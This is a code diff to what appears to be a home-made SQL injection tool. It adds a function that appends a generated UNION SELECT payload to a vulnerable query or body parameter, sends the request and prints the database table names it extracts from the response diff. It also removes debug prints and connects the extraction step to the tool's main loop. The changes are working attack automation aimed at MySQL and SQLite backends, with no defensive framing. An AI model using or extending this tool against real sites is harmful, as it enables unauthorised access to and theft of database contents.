@@ -238,6 +238,9 @@ def parse_detection_records(records: dict) -> list[dict]:
 		record["response"]["content"] = only_new_content(records["default"]["response"]["content"], record["response"]["content"])
 		detection_records.append(record)
 	return detection_records
+
+def strip_html_tags(text: str) -> str:
+    return re.sub(r'<[^>]+>', '', text)
 # ----------------------- #
 
 
@@ -344,7 +347,6 @@ def get_visible_index(injection_point: str, db_type: str, method, url, headers, 
 
 def get_pattern_union(select_size: int, visible_index: int, key : str, from_value : str) -> str:
 	pattern = [key if i is visible_index else "null" for i in range (select_size)]
-	print(pattern)
 	pattern_union = str()
 	for i in range(len(pattern)):
 		if i < len(pattern) - 1:
@@ -353,6 +355,33 @@ def get_pattern_union(select_size: int, visible_index: int, key : str, from_valu
 			pattern_union += f"{pattern[i]} "
 
 	return f"' UNION SELECT " + pattern_union + from_value
+# ----------------------- #
+
+
+
+# --------- DATA EXTRACTION --------- #
+def extract_data(method, url, headers, body, injection_point: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
+	original_query_params = query_params(extract_query_string(url))
+	original_body_params = body_params(body)
+
+	if db_type.lower() == "mysql":
+		extraction_steps = extraction_patterns["mysql"]["table_names"]
+	elif db_type.lower() == "sqlite":
+		extraction_steps = extraction_patterns["sqlite"]["table_names"]
+
+	pattern_union = get_pattern_union(select_size, visible_index, extraction_steps["key"], extraction_steps["from"])
+	if injection_point in original_query_params:
+		original_query_params[injection_point] += pattern_union
+	elif injection_point in original_body_params:
+		original_body_params[injection_point] += pattern_union
+
+	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
+			body_string(original_body_params), injection_point, "extraction", pattern_union)
+
+	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
+	lines = [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
+	print(f"[+] Extracted Table Names:\n{', '.join(lines)}\n")
+
 # ----------------------- #
 
 
@@ -380,7 +409,6 @@ def main():
 				print(f"[!] Cannot proceed with extraction for parameter '{injection_point}' as the database type is unknown.")
 				continue
 
-			print(f"[+] Attempting to determine the number of columns for injection point '{injection_point}'...")
 			num_columns = get_select_size(injection_point, db_type, method, url, headers, body, records["default"])
 			if num_columns is None:
 				print(f"[-] Could not determine the number of columns for injection point '{injection_point}'.\n")
@@ -391,7 +419,7 @@ def main():
 				print(f"[-] Could not determine the visible index for injection point '{injection_point}'.\n")
 				continue
 
-			print(get_pattern_union(num_columns, visible_index, extraction_patterns["mysql"]["table_names"]["key"], extraction_patterns["mysql"]["table_names"]["from"]))
+			extract_data(method, url, headers, body, injection_point, db_type, records["default"], visible_index, num_columns)
 
 	except requests.RequestException as e:
 		print("[!] An error occurred while making the requests:", e)
